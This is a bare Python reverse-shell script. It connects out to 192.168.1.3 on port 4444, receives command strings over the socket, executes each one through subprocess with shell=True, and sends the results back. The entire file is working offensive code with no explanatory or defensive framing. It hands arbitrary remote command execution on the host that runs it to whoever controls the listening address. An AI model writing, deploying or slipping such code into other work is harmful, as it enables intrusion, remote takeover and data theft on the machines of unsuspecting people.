#!/usr/bin python

import socket
import subprocess

def execute_system_command(command):
	return subprocess.check_output(command, shell=True)

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("192.168.1.3", 4444))

#connection.send(self)

while True:
	command = connection.recv(1024)
	command_result= execute_system_command(command)
	connection.send(command_result)
